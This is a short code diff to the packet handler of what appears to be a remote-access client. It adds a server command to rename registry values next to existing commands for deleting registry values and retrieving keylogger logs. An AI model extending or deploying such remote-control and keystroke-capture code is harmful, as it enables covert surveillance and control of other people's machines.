@@ -148,6 +148,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleDeleteRegistryValue((ServerPackets.DoDeleteRegistryValue)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoRenameRegistryValue))
+            {
+                CommandHandler.HandleRenameRegistryValue((ServerPackets.DoRenameRegistryValue)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
